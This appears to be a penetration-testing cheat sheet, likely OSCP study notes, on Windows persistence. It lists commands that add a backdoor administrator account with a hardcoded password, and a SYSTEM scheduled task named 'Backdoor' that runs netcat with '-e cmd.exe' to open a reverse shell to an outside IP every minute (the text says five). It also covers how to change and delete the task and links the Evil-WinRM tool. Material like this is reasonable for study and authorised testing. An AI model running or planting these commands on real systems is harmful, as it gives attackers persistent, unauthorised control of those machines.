### Windows

#### Admin User

```powershell
net user drwily oscp@234 /add
net localgroup "Remote Desktop Users" drwily /add
net localgroup administrators drwily /add
```

#### Firewall Rules

```powershell

```

#### Task Scheduler

Create a scheduled task to run daily at 11:00 as admin

```powershell
SCHTASKS /CREATE /SC DAILY /TN "MyTasks\Notepad task" /TR "C:\Windows\System32\notepad.exe" /ST 11:00 /RU admin
```

Create a scheduled task to run every 5 mins as SYSTEM

```powershell
SCHTASKS /CREATE /TN "Backdoor" /SC MINUTE /MO 1 /tr "c:\coyote\nc.exe -nv 192.168.119.216 8010 -e cmd.exe" /RU "SYSTEM"
```

Show a task:

```powershell
schtasks /query /fo LIST /v /TN "Backdoor"

schtasks /query /fo LIST /v /TN "backup_perl"

schtasks /query
```

Modify an existing task:

```bash
schtasks /change /tr "c:\coyote\nc.exe -nv 192.168.119.216 8010 -e cmd.exe" /TN "Backdoor"

# Uses the same options as when creating task, just specify the option and the value to change to.  Note that some options cannot be changed, just delete it and recreate it then.
```

Delete a task:

```powershell
schtasks /delete /f /tn "Backdoor"
```

#### Evil-WinRM

For systems with Windows Remote Management open (usually port 5985), you can leverage this with valid credentials to do all kinds of things with the system.  

https://github.com/Hackplayers/evil-winrm

